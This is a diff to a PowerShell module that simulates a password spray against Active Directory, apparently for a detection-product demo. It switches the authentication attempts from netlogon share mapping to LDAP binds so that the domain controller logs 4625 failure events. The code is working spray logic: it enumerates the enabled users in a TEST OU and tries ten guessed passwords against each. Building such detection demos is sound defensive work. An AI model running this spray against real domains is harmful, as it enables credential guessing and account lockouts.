@@ -1,12 +1,13 @@
 ################################################################################
 ##
-## DSP-Demo-Activity-07-SecurityPasswordSpray.psm1
+## DSP-Demo-Activity-07-PasswordSpray.psm1
+## VERSION: 2.0
 ##
-## Password spray attack: select 5 users from TEST OU, try 10 passwords each
-## against the netlogon share to generate proper authentication failure events.
+## Password spray attack using LDAP bind (generates proper 4625 events)
 ##
-## Key change from original approach: Uses New-PSDrive with UNC path access
-## rather than AD cmdlets with -Credential, which properly logs failed auth attempts.
+## Uses System.DirectoryServices DirectoryEntry LDAP binding to attempt
+## authentication with bad passwords. This properly triggers auth failure
+## events (4625) that DSP can detect.
 ##
 ################################################################################
 
@@ -66,8 +67,6 @@ function Invoke-PasswordSpray {
     
     $DomainInfo = $Environment.DomainInfo    
     $domainDN = $domainInfo.DN
-    
-    # Get DC from Environment object
     $dcName = $Environment.PrimaryDC
     
     if (-not $dcName) {
@@ -76,10 +75,7 @@ function Invoke-PasswordSpray {
         return $false
     }
     
-    # Target UNC path for authentication attempts (matches legacy script)
-    $uncPath = "\\$dcName\netlogon"
-    
-    # Define test passwords for spray (matches legacy script pattern)
+    # Define test passwords for spray
     $testPasswords = @(
         "SomeP@sswordGu3ss!1",
         "SomeP@sswordGu3ss!2",
@@ -105,7 +101,7 @@ function Invoke-PasswordSpray {
         
         Write-Status "Found TEST OU: $($testOU.DistinguishedName)" -Level Info
         Write-Status "Target DC: $dcName" -Level Info
-        Write-Status "UNC Path: $uncPath" -Level Info
+        Write-Host ""
         
         # Get all enabled users from TEST OU
         $testUsers = Get-ADUser -Filter { Enabled -eq $true } -SearchBase $testOU.DistinguishedName -ErrorAction Stop
@@ -131,31 +127,23 @@ function Invoke-PasswordSpray {
             Write-Status "Spraying user: $($user.SamAccountName)" -Level Info
             
             foreach ($password in $testPasswords) {
-                $driveName = "TempShare_$([guid]::NewGuid().Guid.Substring(0,8))"
-                
                 try {
-                    # Create credential with bad password
-                    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-                    $cred = New-Object System.Management.Automation.PSCredential("$($user.SamAccountName)", $securePassword)
+                    # Use LDAP bind to attempt authentication with bad password
+                    # This properly generates 4625 (logon failure) events in Security log
+                    $de = New-Object System.DirectoryServices.DirectoryEntry(
+                        "LDAP://$dcName",
+                        "$($user.SamAccountName)",
+                        $password,
+                        [System.DirectoryServices.AuthenticationTypes]::Secure
+                    )
                     
-                    # Attempt to access netlogon share with bad credentials
-                    # This generates proper auth failure events in Security log
-                    New-PSDrive -Name $driveName `
-                        -PSProvider FileSystem `
-                        -Root $uncPath `
-                        -Credential $cred `
-                        -ErrorAction Ignore `
-                        -Verbose:$false | Out-Null
-                    
+                    # Force authentication to occur
+                    $root = $de.Children | Out-Null
                     $sprayAttempts++
                 }
                 catch {
-                    # Expected - auth attempt failed
+                    # Expected - auth attempt failed. This is what generates the event.
                     $sprayAttempts++
-                }
-                finally {
-                    # Clean up temporary drive
-                    Get-PSDrive -Name $driveName -ErrorAction SilentlyContinue | Remove-PSDrive -ErrorAction SilentlyContinue
                 }
                 
                 Start-Sleep -Milliseconds 100
@@ -199,4 +187,3 @@ function Invoke-PasswordSpray {
 }
 
 Export-ModuleMember -Function Invoke-PasswordSpray
-
